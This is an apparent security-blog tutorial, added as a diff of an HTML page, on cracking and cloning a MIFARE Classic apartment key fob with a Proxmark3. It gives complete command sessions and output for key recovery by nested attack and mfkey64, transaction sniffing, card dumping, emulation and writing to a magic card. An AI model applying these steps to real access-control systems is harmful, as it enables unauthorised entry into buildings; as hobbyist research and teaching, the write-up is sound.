@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=51372&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Proxmark3: Crack and Clone Apartment RFID Key Fob · x86sec</title>
+
+  <meta name="description" content="Vulnerability research, kernel exploitation, and reverse engineering.">
+  <meta name="author" content="Grant Foudree">
+
+  
+  <meta property="og:title" content="Proxmark3: Crack and Clone Apartment RFID Key Fob">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://localhost:51372/post/rfid-hacking-proxmark/">
+
+  
+  <link rel="canonical" href="http://localhost:51372/post/rfid-hacking-proxmark/">
+  <link rel="alternate" type="application/rss+xml" title="x86sec" href="http://localhost:51372/index.xml">
+
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="/css/main.css">
+
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+</head>
+<body><header class="site-header">
+  <div class="container">
+    <a class="site-logo" href="/" data-text="[x86sec]"><span class="bracket">[</span>x86sec<span class="bracket">]</span></a>
+    <nav class="site-nav">
+      
+      <a href="/"
+         class="active">
+        posts
+      </a>
+      
+      <a href="/about/"
+         class="">
+        about
+      </a>
+      
+    </nav>
+  </div>
+</header>
+<main>
+<div class="container">
+
+  
+  <div class="page-hero">
+    <h1>Proxmark3: Crack and Clone Apartment RFID Key Fob</h1>
+    
+    <div class="hero-meta">
+      <span><span class="dot">date</span> February 20, 2023</span>
+      
+      <span><span class="dot">read</span> 14 min</span>
+      
+      <span>
+        
+        <a href="/tags/rfid" class="tag">rfid</a>
+        
+        <a href="/tags/clone" class="tag">clone</a>
+        
+        <a href="/tags/read" class="tag">read</a>
+        
+        <a href="/tags/crack" class="tag">crack</a>
+        
+        <a href="/tags/proxmark" class="tag">proxmark</a>
+        
+        <a href="/tags/proxmark3" class="tag">proxmark3</a>
+        
+        <a href="/tags/mifare" class="tag">mifare</a>
+        
+        <a href="/tags/mifareclassic" class="tag">mifareclassic</a>
+        
+      </span>
+      
+    </div>
+    
+  </div>
+
+  
+  <div class="post-content">
+    <article class="prose">
+      <h2 id="rfid-hacking">RFID Hacking</h2>
+<h2 id="proxmark">Proxmark</h2>
+<p>The Proxmark is a neat tool to interact with RFID tags and do things like read, write, clone, simulate, and much more. They are portable and have many many features including the ability to crack authentication keys on tags and sniff RFID transactions.</p>
+<img src="/proxmark3.webp" alt="Proxmark3 Easy" style="width:30%;height:100%">
+<h3 id="buying">Buying</h3>
+<p>I chose to buy a Chinese clone (Proxmark 3 Easy) from the &ldquo;PiSwords&rdquo; manufacturer on AliExpress. <strong>So far it has worked without any issues</strong>, and is explicitly claimed to be supported by the <a href="https://github.com/RfidResearchGroup/proxmark3">Iceman fork</a> of the Proxmark firmware. They cost around $40-50 USD on AliExpress/Ebay.</p>
+<h2 id="reading-tags">Reading Tags</h2>
+<p>There are two types of tags, high-frequency (HF) and low-frequency (LF). I suspected the apartment fob was a HF tag as the LF tags tend to have big, bulky readers. We can search for HF tags with the <code>hf search</code> command:</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf search
+ 🕕  Searching for ISO14443-A tag...          
+[+]  UID: 3A 4B 8D A2 
+[+] ATQA: 00 04
+[+]  SAK: 08 [2]
+[+] Possible types:
+[+]    MIFARE Classic 1K
+[=] proprietary non iso14443-4 card found, RATS not supported
+[+] Magic capabilities : Gen 1a
+[+] Prng detection: weak
+[#] Auth error
+[?] Hint: try `hf mf` commands
+
+[+] Valid ISO 14443-A tag found
+</code></pre><p>Looks like the key fob is a MIFARE Classic (1k) card. This is fantastic because these cards are easy to crack/clone due to various security issues :) The datasheet is here <a href="https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf">https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf</a></p>
+<p>From the above command, we have the UID of the card (<code>3A 4B 8D A2</code>). Sometimes readers only check the UID of the card and allow access based on this, but it is very poor security as you can see there&rsquo;s no authentication here. In this instance, writing this UID to a new card did not permit access so let&rsquo;s proceed with reading the rest of the card. We will check if we have access to all the sectors:</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf chk
+[=] Start check for keys...
+[=] .................................
+[=] time in checkkeys 3 seconds
+
+[=] testing to read key B...
+
+[+] found keys:
+
+[+] -----+-----+--------------+---+--------------+----
+[+]  Sec | Blk | key A        |res| key B        |res
+[+] -----+-----+--------------+---+--------------+----
+[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  006 | 027 | ------------ | 0 | ------------ | 0
+[+]  007 | 031 | ------------ | 0 | ------------ | 0
+[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+] -----+-----+--------------+---+--------------+----
+[+] ( 0:Failed / 1:Success )
+</code></pre><p>Here we see that the default key (<code>FFFFFFFFFFFF</code>) works for all the sectors except for 6 &amp; 7, so we will need to get the key to read these sectors.</p>
+<h3 id="autopwn">Autopwn</h3>
+<p>The easiest way to try and recover the key is with the <code>hf mf autopwn</code> command.</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf autopwn
+[!] ⚠️  no known key was supplied, key recovery might fail
+[+] loaded 45 keys from hardcoded default array
+[=] running strategy 1
+[=] Chunk 1.3s | found 28/32 keys (45)
+[=] running strategy 2
+[=] Chunk 1.2s | found 28/32 keys (45)
+[+] target sector   0 key type A -- found valid key [ FFFFFFFFFFFF ] (used for nested / hardnested attack)
+[+] target sector   0 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   1 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   1 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   2 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   2 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   3 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   3 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   4 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   4 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   5 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   5 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   8 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   8 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   9 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector   9 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  10 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  10 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  11 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  11 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  12 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  12 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  13 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  13 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  14 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  14 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  15 key type A -- found valid key [ FFFFFFFFFFFF ]
+[+] target sector  15 key type B -- found valid key [ FFFFFFFFFFFF ]
+[+] Found 1 key candidates
+
+[+] Target block   24 key type A -- found valid key [ 842DE085D591 ]
+
+[+] target sector   6 key type A -- found valid key [ 842DE085D591 ]
+[+] target sector   6 key type B -- found valid key [ F20031EFFAB8 ]
+[+] Found 1 key candidates
+
+[+] Target block   28 key type A -- found valid key [ 9E0E3179DB4C ]
+
+[+] target sector   7 key type A -- found valid key [ 9E0E3179DB4C ]
+[+] target sector   7 key type B -- found valid key [ 88B1F343FB19 ]
+
+[+] found keys:
+
+[+] -----+-----+--------------+---+--------------+----
+[+]  Sec | Blk | key A        |res| key B        |res
+[+] -----+-----+--------------+---+--------------+----
+[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  001 | 007 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  002 | 011 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  006 | 027 | 842DE085D591 | N | F20031EFFAB8 | A
+[+]  007 | 031 | 9E0E3179DB4C | N | 88B1F343FB19 | A
+[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+[+] -----+-----+--------------+---+--------------+----
+[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )
+</code></pre><p>Within about 5 seconds, all the keys were found via the &ldquo;nested&rdquo; attack: sectors {6 = <code>842DE085D591</code>, 7 = <code>9E0E3179DB4C</code>}. Easy!</p>
+<h3 id="sniffing">Sniffing</h3>
+<p>Sometimes it will not be this easy to recover the keys, in which case sniffing the RFID transactions can help.</p>
+<p>We can sniff the interaction with <code>hf 14a sniff -r -c</code> (the <code>-r</code> and <code>-c</code> are useful to wait to sniff until the card and reader start talking as the trace can be quite noisy).</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf 14a sniff -r -c
+
+[#] Starting to sniff. Press PM3 Button to stop.
+[#] trace len = 1992
+</code></pre><p>Here we can see that data was recorded (great!). Since we know it is a MIFARE Classic card, we can use the Proxmark to decode the trace as such with <code>trace list -t mf</code>.</p>
+<pre tabindex="0"><code>Src | Data (! denotes parity error)                                           | CRC | Annotation
+----+-------------------------------------------------------------------------+-----+--------------------
+Tag |00(2)                                                                    |     | 
+Tag |04  00                                                                   |     | 
+Tag |04  00                                                                   |     | 
+Tag |04  00                                                                   |     | 
+Tag |3a  4b  8d  a2  5e                                                       |     | 
+Tag |08  b6  dd                                                               |     | 
+Tag |04(4)                                                                    |     | 
+Tag |04  00                                                                   |     | 
+Tag |3a  4b  8d  a2  5e                                                       |     | 
+Tag |08  b6  dd                                                               |     | 
+Tag |e0  39  6b  c9                                                           |     | 
+Tag |78! 2a! d0! 3f                                                           |     | 
+Tag |ac  7a! 0d  03                                                           |     | 
+Tag |93! 3b! 11! 7d!                                                          |     | 
+Tag |8e  e0! d6  79! cf! 36  64  4b  b8  32! e4  1d  34  ef! 6a! 77  b0! 46!  |  !! | 
+Tag |03(4)                                                                    |     | 
+Rdr |26(7)                                                                    |     | REQA
+Tag |04  00                                                                   |     | 
+Rdr |93  20                                                                   |     | ANTICOLL
+Tag |3a  4b  8d  a2  5e                                                       |     | 
+Rdr |93  70  3a  4b  8d  a2  5e  60  43                                       |  ok | SELECT_UID                  1
+Tag |08  b6  dd                                                               |     | 
+Rdr |e0  80  31  73                                                           |  ok | RATS
+Tag |04(4)                                                                    |     | 
+Rdr |26(7)                                                                    |     | REQA
+Tag |04  00                                                                   |     | 
+Tag |[[3a  4b  8d  a2  5e]]                                                   |     |                             2
+Rdr |93  70  3a  4b  8d  a2  5e  60  43                                       |  ok | SELECT_UID
+Tag |08  b6  dd                                                               |     | 
+Rdr |60  1c  18  a1                                                           |  ok | AUTH-A(28)                  3
+Tag |[[0e  f9  a4  7f]]                                                       |     | AUTH: nt 
+Rdr |[[4e! a0! 24! 02]]  [[e6  71  f1  af!]]                                  |     | AUTH: nr ar (enc)
+Tag |[[70  9a! 57! 8c]]                                                       |     | AUTH: at (enc)
+Rdr |b7  2e! 8d  73!                                                          |     | 
+ *  |                                              key 9E0E3179DB4C prng WEAK |     |
+ *  |60  18  3C  E7                                                           |  ok | AUTH-A(24)                  4
+Tag |ab! be! b3! 92                                                           |     | AUTH: nt (enc)
+Rdr |4b! c6  06  b3! b6! 49  8c  31!                                          |     | AUTH: nr ar (enc)
+Tag |f5  36  a3  d1                                                           |     | AUTH: at (enc)
+Rdr |0f! c7! 01  8c                                                           |     | 
+ *  | nested probable key: 842DE085D591     ks2:74f50050 ks3:2710296b         |     |
+ *  |30  18  CB  34                                                           |  ok | READBLOCK(24)               5
+Tag |51! b8! 75  af! f4! dd! e3  51  2f! 2a! 0e  7a  11! 5b  0f! 31  53  f4!  |     | 
+ *  |45  21  58  8B  87  A1  F5  70  07  AF  A0  D7  10  63  26  31  39  44   |  ok | 
+Rdr |26(7)                                                                    |     | REQA
+Rdr |26(7)                                                                    |     | REQA
+Tag |04  00                                                                   |     | 
+</code></pre><p>Many things are happening above, but essentially the following steps take place:</p>
+<ol>
+<li>Reader asks the card for its UID ( <code>SELECT_UID</code> )</li>
+<li>Card responds with a UID of <code>3A4B8DA2</code> (which is what we saw earlier with the <code>hf detect</code> command)</li>
+<li>Reader peforms authentication ( <code>AUTH-A</code> ) for block 28</li>
+<li>Reader then performs authentication ( <code>AUTH-A</code> ) for block 24</li>
+<li>Reader asks to read block 24 ( <code>READBLOCK </code>)</li>
+</ol>
+<p><img src="/mifare_read.webp" alt="Mifare Read"></p>
+<p>Based on these transactions, it appears as if the reader wants more than just the UID for authenticating the key fob, but also the contents of block 24.</p>
+<h3 id="cracking-the-key">Cracking The Key</h3>
+<p>Above, Proxmark did all the work to crack the key for us, but we can do so manually as well. We need 5 things: UID, NT, NR, AR, and AT, all of which are in the trace above. The table below explains what each byte represents in the sequence. With these, we can use the following script to generate the key:</p>
+<p><img src="/mifare_auth.webp" alt="Mifare Authentication"></p>
+<pre tabindex="0"><code>└─$ tools/mfkey/mfkey64 3a4b8da2 0ef9a47f 4ea02402 e671f1af 709a578c
+
+MIFARE Classic key recovery - based 64 bits of keystream
+Recover key from only one complete authentication!
+
+Recovering key for:
+  uid: 3a4b8da2
+   nt: 0ef9a47f
+ {nr}: 4ea02402
+ {ar}: e671f1af
+ {at}: 709a578c
+
+LFSR successors of the tag challenge:
+  nt&#39;: 42e05803
+ nt&#39;&#39;: ffdba0f0
+
+Keystream used to generate {ar} and {at}:
+  ks2: a491a9ac
+  ks3: 8f41f77c
+
+Found Key: [9e0e3179db4c]
+</code></pre><p>Now we have the key for sector 7, but need the key for sector 6. We can see the key we cracked is for sector 7 because in the authentication command (<code>60  1c  18  a1</code>), it is for block 28 (0x1C).</p>
+<pre tabindex="0"><code>[+] -----+-----+--------------+---+--------------+----
+[+]  Sec | Blk | key A        |res| key B        |res
+[+] -----+-----+--------------+---+--------------+----
+[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  006 | 027 | ------------ | 0 | ------------ | 0
+[+]  007 | 031 | 9E0E3179DB4C | 1 | 88B1F343FB19 | 1
+[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+] -----+-----+--------------+---+--------------+----
+</code></pre><p>Since we have the key for sector 7 (<code>9E0E3179DB4C</code>), we can use the nested attack to try and get the key for sector 6:</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf nested --tblk 27 --blk 31 -k 9E0E3179DB4C --1k
+[+] Found 1 key candidates
+
+[+] Target block   27 key type A -- found valid key [ 842DE085D591 ]
+</code></pre><p>Great! Now we can use this key <code>842DE085D591</code> to see if we can read the block the reader is interested in (24)</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf rdbl --blk 24 -k 842DE085D591
+
+[=]   # | sector 06 / 0x06                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=]  24 | 45 21 58 8B 87 A1 F5 70 07 AF A0 D7 10 63 26 31 | E!X....p.....c&amp;1 
+</code></pre><p>Success!</p>
+<h2 id="dump--clone">Dump &amp; Clone</h2>
+<p>Now that we have the keys to read the entire card, let&rsquo;s dump the contents to a file so we can emulate it or clone it to a new tag.</p>
+<p>If you used the autopwn method, there will be a file generated <code>hf-mf-3A4B8DA2-key.bin</code> which contains the keys for each sector. With this, Proxmark can dump out all the sectors of the card. Unfortunately, I&rsquo;m not sure how to use the <code>dump</code> command without this keys file (you can make this yourself, it is just a hex dump of all the keys), but you can manually read each block with the above command <code>hf mf rdbl</code>.</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf dump --1k --keys hf-mf-3A4B8DA2-key.bin
+[=] Using `hf-mf-3A4B8DA2-key.bin`
+[=] Reading sector access bits...
+[=] .................
+[+] Finished reading sector access bits
+[=] Dumping all blocks from card...
+[+] successfully read block  0 of sector  0.
+[+] successfully read block  1 of sector  0.
+...
+[+] successfully read block  3 of sector 15.
+[+] time: 7 seconds
+
+[+] Succeeded in dumping all blocks
+
+[=] FILE PATH:  hf-mf-3A4B8DA2-dump-8.bin
+[+] saved 1024 bytes to binary file hf-mf-3A4B8DA2-dump.bin
+[=] FILE PATH:  hf-mf-3A4B8DA2-dump-8.eml
+[+] saved 64 blocks to text file hf-mf-3A4B8DA2-dump.eml
+[=] FILE PATH:  hf-mf-3A4B8DA2-dump-8.json
+[+] saved to json file hf-mf-3A4B8DA2-dump.json
+</code></pre><p>You can peek at these files and see the raw contents of the RFID tag.</p>
+<h3 id="simulating">Simulating</h3>
+<p>With the dump we generated earlier, we can load it into Proxmark&rsquo;s simulator and launch it:</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf eload --1k -f hf-mf-3A4B8DA2-dump.eml
+[=] 64 blocks ( 1024 bytes ) to upload
+[+] loaded 1024 bytes from text file hf-mf-3A4B8DA2-dump.eml
+[=] Uploading to emulator memory
+[=] .................................................................
+[?] You are ready to simulate. See `hf mf sim -h`
+[=] Done!
+</code></pre><p>Launch simulator</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf sim --1k -u 3A4B8DA2 -v
+[=] MIFARE 1K | 4 byte UID  3A 4B 8D A2 
+[=] Options [ numreads: 0, flags: 258 (0x102) ]
+[=] Press pm3-button to abort simulation
+
+[#] Enforcing Mifare 1K ATQA/SAK
+[#] 4B UID: 3a4b8da2
+[#] ATQA  : 00 04
+[#] SAK   : 08
+</code></pre><center>
+<blockquote class="imgur-embed-pub" lang="en" data-id="a/okx5C44" data-context="false" ><a href="//imgur.com/a/okx5C44"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
+</center>
+<p>Success!</p>
+<h3 id="cloning">Cloning</h3>
+<p>Similar to simulating the card, we can load the dump from earlier and write it into a new tag. If you use one of the &ldquo;magic&rdquo; MIFARE Classic cards, you can overwrite the UID and use the following command:</p>
+<pre tabindex="0"><code>[usb] pm3 --&gt; hf mf cload -f hf-mf-3A4B8DA2-dump.eml
+[+] loaded 1024 bytes from text file hf-mf-3A4B8DA2-dump.eml
+[=] Copying to magic gen1a card
+[=] .................................................................
+
+[+] Card loaded
+</code></pre>
+    </article>
+
+    
+    
+    <div class="pagination" style="margin-top:3rem;">
+      <a href="http://localhost:51372/post/sierra-wireless-em7455-4g-modem-hacking/">← Sierra Wireless EM7455 4G Modem Hacking</a>
+      <a href="http://localhost:51372/post/uefi-oprom-bootkit/">UEFI Option ROM Bootkit →</a>
+    </div>
+    
+  </div>
+
+</div>
+
+  </main><footer class="site-footer">
+  <div class="container">
+    <div class="footer-left">
+      <strong>x86sec</strong> — a cybersecurity blog<br>
+      &copy; 2026 Grant Foudree
+    </div>
+    <div class="footer-links">
+      <a href="https://github.com/gfoudree" rel="noopener">github</a>
+    </div>
+  </div>
+</footer>
+<script src="/js/main.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+</html>
